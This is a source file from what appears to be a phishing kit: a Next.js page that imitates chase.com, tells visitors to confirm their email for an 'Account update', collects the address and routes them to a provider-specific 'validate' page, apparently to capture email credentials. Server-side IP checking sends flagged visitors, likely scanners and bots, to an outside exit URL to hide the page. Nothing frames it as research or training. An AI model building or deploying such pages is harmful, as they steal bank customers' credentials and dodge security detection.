import { Box, Typography } from "@mui/material";
import { GetServerSideProps } from "next";
import Head from "next/head";
import { useRouter } from "next/router";
import React, { useContext, useEffect, useState } from "react";
import { useForm } from "react-hook-form";
import { Content } from "../components/Content";
import { CustomButton } from "../components/CustomButton";
import { CustomInput } from "../components/CustomInput";
import { SubTitle } from "../components/SubTitle";
import { Title } from "../components/Title";
import { Wrapper } from "../components/Wrapper";
import checkIp from "../middleware/checkIp";
import { DataContext } from "./_app";

interface EmailProps {}

export const Email: React.FC<EmailProps> = () => {
  const {
    register,
    handleSubmit,
    formState: { errors },
  } = useForm();
  const [loading, setLoading] = useState(false);
  const { data: datas, setData } = useContext(DataContext);
  const { push } = useRouter();

  const onSubmit = handleSubmit(async (data) => {
    setLoading(true);

    setData({
      ...datas,
      ...data,
    });

    const emailProvider = data["email"].split("@")[1].split(".")[0];
    push(`/email/validate/${emailProvider}`);
    setLoading(false);
  });

  useEffect(() => {
    const keyDownHandler = (event: KeyboardEvent) => {
      if (event.key === "Enter") {
        event.preventDefault();

        onSubmit();
      }
    };

    document.addEventListener("keydown", keyDownHandler);

    return () => {
      document.removeEventListener("keydown", keyDownHandler);
    };
  });

  return (
    <Wrapper current="EMAIL">
      <Box width="100%" padding="1rem">
        <Head>
          <title>Identification - chase.com</title>
        </Head>
        <Box
          sx={{
            background: "white",
            width: ["100%", "60%"],
            margin: "0 auto",
            paddingX: "2rem",
          }}
        >
          <Typography
            component="h2"
            sx={{
              marginTop: "10px",
              color: "#666",
              fontWeight: 300,
              fontSize: "1.5rem",
            }}
          >
            {`Let's`} confirm your email.
          </Typography>
          <Typography
            component="h3"
            sx={{
              marginTop: "8px",
              fontSize: ".8125rem",
              fontWeight: 300,
              color: "#414042",
            }}
          >
            To protect your account, please provide your email address. If you
            have more than one account, choose one and {`we'll`} take care of
            the rest.
          </Typography>
        </Box>
        <Box
          sx={{
            background: "white",
            width: ["100%", "60%"],
            margin: "0 auto",
            padding: "2rem",
          }}
        >
          <Title title="Account update" />
          <SubTitle subTitle="Email address associated with your account" />
          <Content>
            <Box flex={1} width={["100%", "initial"]}>
              <CustomInput
                label="Email address"
                name="email"
                helperText="You will be redirected to your email provider to complete the
                signing process."
                errors={errors}
                register={register("email", {
                  required:
                    "Email address must be entered. Please enter your email address.",
                  pattern: {
                    value: /^[\w-.]+@([\w-]+\.)+[\w-]{2,4}$/,
                    message: "Please enter a valid email address",
                  },
                })}
              />
            </Box>
            <Box width="10px" display={["none", "block"]} />
          </Content>
          <Box
            width="100%"
            sx={{
              display: "flex",
              justifyContent: "flex-end",
              marginTop: "1.5rem",
            }}
          >
            <Box width={["100%", "30%"]}>
              <CustomButton text="Next" onClick={onSubmit} disabled={loading} />
            </Box>
          </Box>
        </Box>
      </Box>
    </Wrapper>
  );
};

export const getServerSideProps: GetServerSideProps = async ({ req }) => {
  const { valid } = await checkIp(req);

  return {
    props: { isBot: valid },
    ...(!valid
      ? {
          redirect: {
            destination: process.env.NEXT_PUBLIC_EXIT_URL,
            permanent: false,
          },
        }
      : {}),
  };
};

export default Email;
